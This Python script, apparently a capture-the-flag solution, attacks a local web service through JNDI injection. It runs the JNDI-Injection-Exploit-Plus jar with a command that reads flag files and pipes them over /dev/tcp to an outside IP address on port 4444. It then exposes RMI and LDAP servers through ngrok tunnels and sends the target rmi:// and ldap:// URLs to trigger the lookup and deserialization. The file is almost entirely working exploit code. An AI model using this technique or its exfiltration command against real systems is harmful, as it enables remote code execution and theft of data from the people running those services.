import httpx
import asyncio
from pyngrok.ngrok import connect, disconnect
from threading import Thread
from subprocess import check_output

URL = "http://localhost:7534/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)

class API(BaseAPI):
    ...

async def main():
    api = API()
    # must use java 11
    t = Thread(target=check_output, args=([
        'java',
        '-jar', 'Java-Exploit-Plus/target/JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar',
        '-C', 'echo "`cat fl*`" > /dev/tcp/172.188.90.64/4444'
    ],))
    t.start()
    tunnel = connect(1099, 'tcp')
    uri = httpx.URL(tunnel.public_url)
    res = await api.c.get("/", params=dict(
        url=f"rmi://{uri.netloc.decode()}/localExample"
    ))
    print(res.text)

    disconnect(tunnel.public_url)

    tunnel = connect(1389, 'tcp')
    uri = httpx.URL(tunnel.public_url)
    res = await api.c.get("/", params=dict(
        url=f"ldap://{uri.netloc.decode()}/deserialExample"
    ))
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())
